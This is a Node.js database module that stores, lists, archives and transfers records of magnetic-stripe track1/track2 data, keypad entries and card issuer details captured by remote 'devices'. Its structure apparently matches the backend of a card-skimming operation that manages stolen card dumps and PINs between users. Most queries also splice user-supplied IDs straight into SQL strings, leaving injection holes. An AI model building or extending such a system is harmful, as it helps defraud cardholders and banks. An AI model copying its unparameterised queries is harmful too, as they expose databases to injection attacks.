const db = require('./db');

class Data {
    static addData(body) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`INSERT data SET ? `, body, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows.insertId);
            });
        });

    }

    static getInboxDataForNomal(userId) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`
                    SELECT devices.id, devices.key, devices.type, devices.user_id, devices.A6_name as device_name,
                    data.id as data_id, data.track1, data.track2, data.keypad, data.device_id, data.to_user_id, data.transferred,
                    data.card_number_length, data.card_type, data.card_brand, data.card_country_name, data.card_country_currency, data.card_bank_name, data.card_bank_url
                    FROM devices
                    LEFT JOIN data
                    ON devices.id = data.device_id
                    WHERE (data.user_id = ${userId} OR data.to_user_id = ${userId}) 
                    AND data.archived = 0
                    ORDER BY devices.id, data_id DESC`, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows);
            });
        });
    }

    static getInboxData(userId) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`
                    SELECT devices.id, devices.key, devices.type, devices.user_id, devices.A6_name as device_name,
                    data.id as data_id, data.track1, data.track2, data.keypad, data.device_id, data.to_user_id, data.transferred,
                    data.card_number_length, data.card_type, data.card_brand, data.card_country_name, data.card_country_currency, data.card_bank_name, data.card_bank_url,
                    users.username, users.user_type
                    FROM devices
                    LEFT JOIN data
                    ON devices.id = data.device_id
                    LEFT JOIN users
                    ON devices.user_id = users.id
                    WHERE (data.user_id = ${userId} OR data.to_user_id = ${userId}) 
                    AND data.archived = 0
                    AND data.transferred = 0
                    ORDER BY devices.id`, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows);
            });
        });
    }

    static getArchiveData(userId) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`
                SELECT devices.id, devices.key, devices.type, devices.user_id, devices.A6_name as device_name,
                data.id as data_id, data.track1, data.track2, data.keypad, data.device_id, data.to_user_id, data.transferred,
                data.card_number_length, data.card_type, data.card_brand, data.card_country_name, data.card_country_currency, data.card_bank_name, data.card_bank_url,
                users.username, users.user_type
                FROM devices
                LEFT JOIN data
                ON devices.id = data.device_id
                LEFT JOIN users
                ON devices.user_id = users.id
                WHERE (data.user_id = ${userId} OR data.to_user_id = ${userId}) 
                AND data.archived = 1
                AND data.transferred = 0
                ORDER BY devices.id`, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows);
            });
        });
    }

    static updateData(id, body) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`UPDATE data SET ? WHERE id = ${id} `, body, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows);
            });
        });
    }

    static transferData(body, id) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`UPDATE data SET ? WHERE id = ${id}`, body, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows);
            });
        });
    }

    static getTransferredData(ids) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`SELECT data.*, devices.A6_name as device_name, devices.type, users.username as from_user, users1.username as to_user
                         FROM data
                         LEFT JOIN devices
                         ON data.device_id = devices.id
                         LEFT JOIN users
                         ON data.user_id = users.id
                         LEFT JOIN users as users1
                         ON data.to_user_id = users1.id
                         WHERE transferred = 1 
                         AND data.user_id IN (${ids})`, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows);
            });
        });
    }

    static deleteData(id) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`DELETE FROM data WHERE id = ${id}`, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows);
            });
        });
    }

    static archiveData(id) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`UPDATE data SET archived = 1 WHERE id = ${id}`, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows);
            });
        });
    }

    static unarchiveData(id) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`UPDATE data SET archived = 0 WHERE id = ${id}`, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows);
            });
        });
    }

    static addBoardData(body) {
        const conn = db().connection();

        return new Promise((resolve, reject) => {
            conn.query(`INSERT board_data SET ? `, body, (error, rows) => {
                db().close();
                if (error) reject(error);
                else resolve(rows.insertId);
            });
        });

    }
}

module.exports = Data;